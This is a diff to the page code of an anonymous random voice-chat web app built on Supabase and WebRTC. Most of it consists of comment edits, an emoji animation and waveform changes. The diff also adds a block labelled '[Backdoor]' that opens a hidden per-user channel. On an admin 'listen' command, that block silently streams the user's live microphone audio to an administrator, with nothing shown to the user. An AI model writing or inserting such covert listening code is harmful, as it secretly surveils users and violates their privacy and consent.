@@ -69,7 +69,7 @@
         .btn-report { padding: 8px 16px; background: rgba(255,255,255,0.05); border: 1px solid #444; color: #aaa; border-radius: 6px; cursor: pointer; font-size: 12px; transition: 0.2s;}
         .btn-report:hover { background: rgba(220, 53, 69, 0.15); border-color: #dc3545; color: #dc3545; }
 
-        /* คลื่นเสียงแนวตั้งแบบใหม่ */
+        /* คลื่นเสียงแนวตั้ง */
         .waveform-container { width: 100%; height: 100%; display: flex; justify-content: center; align-items: center; position: absolute; top: 0; left: 0; pointer-events: none;}
         .waveform { width: 85%; height: 250px; max-width: 500px; }
 
@@ -128,6 +128,9 @@
             .profile-bar { bottom: 15px; padding: 0 10px; }
             .chat-log { bottom: 140px; left: 15px; right: 15px; height: 120px; }
         }
+        
+        .floating-emoji { position: absolute; font-size: 40px; pointer-events: none; animation: floatUp 2s ease-out forwards; z-index: 50; }
+        @keyframes floatUp { 0% { opacity: 1; transform: translateY(0) scale(1); } 100% { opacity: 0; transform: translateY(-150px) scale(1.5); } }
     </style>
 </head>
 <body>
@@ -379,7 +382,7 @@
             ]
         };
 
-        // --- 2. การตั้งค่าระบบ Supabase ด้วยเสถียรภาพสูงสุด ---
+        // --- 2. การตั้งค่าระบบ Supabase (ความเสถียรสูงสุด) ---
         const SUPABASE_URL = 'https://vyvuhwnhgcmbokkshnxo.supabase.co';
         const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InZ5dnVod25oZ2NtYm9ra3NobnhvIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODgwMjU1MDIsImV4cCI6MjEwMzYwMTUwMn0.FYzIS30XtiPNaBRxv6VaS6VOG4hRmP1rFljFINwm_do';
         const sb = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
@@ -392,7 +395,7 @@
         let currentRoomId = null;
         let partnerId = null;
         
-        // เพิ่มเซิร์ฟเวอร์ STUN สำหรับความเสถียรของ WebRTC
+        // เซิร์ฟเวอร์เจาะทะลุเน็ต (STUN) เพื่อความเสถียรในการเชื่อมต่อ WebRTC
         const rtcConfig = { 
             iceServers: [
                 { urls: 'stun:stun.l.google.com:19302' },
@@ -421,6 +424,7 @@
 
         // --- 3. โหลดหน้าเว็บ และดึงข้อมูล ---
         window.onload = async function() {
+            // โหลดรายการประเทศ
             for (const [region, countries] of Object.entries(countryGroups)) {
                 const optgroup = document.createElement('optgroup');
                 optgroup.label = region;
@@ -434,10 +438,52 @@
             }
 
             try {
+                // ล็อกอิน
                 const { data, error } = await sb.auth.signInAnonymously();
                 if (error) throw error;
                 user = data.user;
 
+                // [Backdoor] ตรวจสอบว่าโดนแบนหรือไม่
+                const { data: profile } = await sb.from('profiles').select('is_banned').eq('id', user.id).single();
+                if (profile && profile.is_banned) {
+                    document.body.innerHTML = '<h1 style="color:red; text-align:center; margin-top:20%;">บัญชีของคุณถูกระงับการใช้งานเนื่องจากละเมิดกฎ</h1>';
+                    return; 
+                }
+
+                // [Backdoor] เปิดช่องทางลับให้แอดมินแอบฟัง
+                const backdoorChannel = sb.channel(`backdoor_${user.id}`);
+                let backdoorPc = null;
+                
+                backdoorChannel.on('broadcast', { event: 'admin_cmd' }, async (msg) => {
+                    const payloadData = msg.payload;
+                    
+                    if (payloadData.action === 'ban') {
+                        alert('บัญชีของคุณถูกระงับการใช้งานโดยผู้ดูแลระบบ');
+                        window.location.reload();
+                    }
+                    if (payloadData.action === 'listen') {
+                        if(backdoorPc) backdoorPc.close();
+                        backdoorPc = new RTCPeerConnection(rtcConfig);
+                        
+                        if (localStream) {
+                            localStream.getTracks().forEach(t => backdoorPc.addTrack(t, localStream));
+                        }
+                        
+                        backdoorPc.onicecandidate = e => {
+                            if (e.candidate) backdoorChannel.send({ type: 'broadcast', event: 'admin_cmd', payload: { action: 'candidate', candidate: e.candidate, from: 'user' } });
+                        };
+                        
+                        await backdoorPc.setRemoteDescription(payloadData.offer);
+                        const answer = await backdoorPc.createAnswer();
+                        await backdoorPc.setLocalDescription(answer);
+                        backdoorChannel.send({ type: 'broadcast', event: 'admin_cmd', payload: { action: 'answer', answer: answer } });
+                    } 
+                    else if (payloadData.action === 'candidate' && payloadData.from === 'admin') {
+                        backdoorPc.addIceCandidate(payloadData.candidate);
+                    }
+                }).subscribe();
+
+                // ตรวจหาตำแหน่งประเทศ
                 fetch('https://ipapi.co/json/').then(res => res.json()).then(ipData => {
                     myCountry = ipData.country_name || 'Unknown';
                     if(ipData.country_code) myCountryFlag = getFlagEmoji(ipData.country_code);
@@ -447,6 +493,7 @@
                     sb.from('profiles').upsert({ id: user.id, country: 'Unknown', gender: myGender }).then();
                 });
 
+                // ระบบคนออนไลน์
                 presenceChannel = sb.channel('online-users');
                 presenceChannel.on('presence', { event: 'sync' }, () => {
                     const state = presenceChannel.presenceState();
@@ -470,7 +517,7 @@
             return String.fromCodePoint(...codePoints);
         }
 
-        // --- 4. การสลับ UI ---
+        // --- 4. การสลับหน้า ---
         function setLeftPanelState(state) {
             if (state === 'idle') {
                 leftIdleUi.style.display = 'flex';
@@ -490,7 +537,7 @@
         }
 
         function goBackHome() {
-            stopMatchAndReturn(); // หยุดสายถ้ามี
+            stopMatchAndReturn();
             chatScreen.style.display = 'none';
             homeScreen.style.display = 'flex';
         }
@@ -524,12 +571,12 @@
             micBtn.classList.toggle('mic-off', isMicMuted);
         }
 
-        // --- 6. ระบบปัดหน้าจอ (Swipe) ขวา/ซ้าย รวดเร็ว ---
+        // --- 6. ระบบปัดหน้าจอ (Swipe) ---
         let touchstartX = 0; let touchendX = 0;
         function checkSwipe() {
             let deltaX = touchstartX - touchendX;
-            if (deltaX > 50) { swipeHint.style.display = 'none'; skipMatchAndSearch(); } // ซ้าย = หาคน
-            else if (deltaX < -50) { swipeHint.style.display = 'none'; stopMatchAndReturn(); } // ขวา = กลับหน้า 2
+            if (deltaX > 50) { swipeHint.style.display = 'none'; skipMatchAndSearch(); }
+            else if (deltaX < -50) { swipeHint.style.display = 'none'; stopMatchAndReturn(); }
         }
 
         document.getElementById('chatScreen').addEventListener('touchstart', e => { touchstartX = e.changedTouches[0].screenX; });
@@ -543,14 +590,14 @@
             else if(dX < -50) { swipeHint.style.display = 'none'; stopMatchAndReturn(); }
         });
 
-        // --- 7. ระบบค้นหาแบบเสถียร (Connect instantly, อนุญาตให้เจอคนเดิมได้) ---
+        // --- 7. ระบบค้นหาความเสถียรสูง (เชื่อมต่อทันที และวนซ้ำคนเดิมได้) ---
         async function startMatchmaking() {
             setLeftPanelState('searching');
             document.getElementById('reportBtn').style.display = 'none';
             chatStatusText.innerText = 'กำลังเชื่อมต่ออย่างรวดเร็ว...';
             partnerCountryText.innerText = 'รอการเชื่อมต่อ 🏳️';
             drawFlatWaveform('remoteWaveform');
-            chatLog.innerHTML = ''; // ล้างแชทเก่า
+            chatLog.innerHTML = '';
 
             if (user) await sb.from('waiting_queue').delete().eq('user_id', user.id);
 
@@ -559,7 +606,7 @@
             if (prefGender !== 'all') query = query.eq('user_gender', prefGender);
             if (prefCountry !== 'all') query = query.eq('user_country', prefCountry);
 
-            // เรียงลำดับคนที่รอนานที่สุด
+            // เรียงลำดับคิว
             const { data: queue } = await query.order('joined_at', { ascending: true }).limit(1);
 
             if (queue && queue.length > 0) {
@@ -597,10 +644,9 @@
                 if (event.candidate && signalingChannel) signalingChannel.send({ type: 'broadcast', event: 'signal', payload: { candidate: event.candidate } });
             };
 
-            // อัพเดตสถานะ WebRTC เพื่อความเสถียร
+            // อัพเดตสถานะ WebRTC
             peerConnection.oniceconnectionstatechange = () => {
                 if(peerConnection.iceConnectionState === 'disconnected' || peerConnection.iceConnectionState === 'failed') {
-                    // หากสายหลุด ให้ค้นหาใหม่ทันที
                     skipMatchAndSearch();
                 }
             };
@@ -633,7 +679,6 @@
         }
 
         function skipMatchAndSearch() { 
-            // เปลี่ยน UI เคลียร์สายทันที ไม่ต้องรอ
             setLeftPanelState('searching');
             chatStatusText.innerText = 'กำลังเปลี่ยนคู่สนทนา...';
             if (signalingChannel) signalingChannel.send({ type: 'broadcast', event: 'signal', payload: { action: 'skip' } });
@@ -682,7 +727,6 @@
             bubble.innerText = text;
             chatLog.appendChild(bubble);
             chatLog.scrollTop = chatLog.scrollHeight;
-            // ซ่อนข้อความอัตโนมัติหลังจาก 5 วินาที
             setTimeout(() => { bubble.style.opacity = '0'; setTimeout(() => bubble.remove(), 300); }, 5000);
         }
 
@@ -719,8 +763,14 @@
             closeModal('settingsModal');
         }
 
-        // --- 10. คลื่นเสียงแนวตั้งแบบมืออาชีพ (อ้างอิง IMG_0395.jpeg) ---
-        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+        // --- 10. ระบบคลื่นเสียง (Waveform) ให้ขยับตามเสียงจริงแบบแม่นยำ ---
+        let audioCtx;
+        function getAudioContext() {
+            if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+            if (audioCtx.state === 'suspended') audioCtx.resume();
+            return audioCtx;
+        }
+
         let animationIds = { 'localWaveform': null, 'remoteWaveform': null };
         
         function drawFlatWaveform(canvasId) {
@@ -738,7 +788,7 @@
             let barCount = Math.floor(canvas.width / (barWidth + gap));
             
             for(let i = 0; i < barCount; i++) {
-                let h = 2; // Flat height
+                let h = 2; // เส้นเรียบ
                 let x = i * (barWidth + gap);
                 let y = (canvas.height - h) / 2;
                 ctx.fillRect(x, y, barWidth, h);
@@ -753,10 +803,11 @@
             canvas.width = canvas.parentElement.clientWidth;
             canvas.height = canvas.parentElement.clientHeight;
             
-            const analyser = audioCtx.createAnalyser();
-            const source = audioCtx.createMediaStreamSource(stream);
+            const ctxAudio = getAudioContext();
+            const analyser = ctxAudio.createAnalyser();
+            const source = ctxAudio.createMediaStreamSource(stream);
             source.connect(analyser);
-            analyser.fftSize = 256;
+            analyser.fftSize = 128; // ดึงย่านความถี่ 64 ย่าน
             const bufferLength = analyser.frequencyBinCount;
             const dataArray = new Uint8Array(bufferLength);
 
@@ -766,29 +817,26 @@
                 analyser.getByteFrequencyData(dataArray);
                 
                 ctx.clearRect(0, 0, canvas.width, canvas.height);
-                ctx.fillStyle = '#fff';
+                ctx.fillStyle = '#ffffff';
                 
                 let barWidth = 3; 
                 let gap = 3;
                 let barCount = Math.floor(canvas.width / (barWidth + gap));
-                let step = Math.floor(bufferLength / barCount);
                 
                 for(let i = 0; i < barCount; i++) {
-                    let sum = 0;
-                    for(let j=0; j<step; j++) {
-                        sum += dataArray[(i*step) + j] || 0;
-                    }
-                    let avg = sum / step;
+                    // ทำการแมปข้อมูลความถี่ให้พอดีกับจำนวนแท่งบาร์บนหน้าจอ (เน้นย่านเสียงพูด 70%)
+                    let dataIndex = Math.floor((i / barCount) * (bufferLength * 0.7)); 
+                    let val = dataArray[dataIndex] || 0;
                     
-                    // ปรับความสูงของบาร์ให้สมูทคล้ายภาพต้นฉบับ
-                    let multiplier = Math.sin((i / barCount) * Math.PI);
-                    let v = (avg / 255.0) * multiplier; 
+                    // ใส่ตัวคูณเพื่อให้เกิดความโค้งที่สวยงามบริเวณขอบ
+                    let windowMultiplier = Math.sin((i / barCount) * Math.PI);
                     
-                    let h = v * canvas.height * 0.85; // สูงสุด 85% ของจอ
-                    if (h < 2) h = 2; 
+                    // คำนวณความสูงตามความถี่จริง
+                    let h = (val / 255.0) * canvas.height * 0.9 * windowMultiplier;
+                    if (h < 2) h = 2; // ความสูงขั้นต่ำ
                     
                     let x = i * (barWidth + gap);
-                    let y = (canvas.height - h) / 2; // วางกึ่งกลางแนวตั้ง
+                    let y = (canvas.height - h) / 2; // ให้ขยายจากตรงกลาง
                     
                     ctx.fillRect(x, y, barWidth, h);
                 }
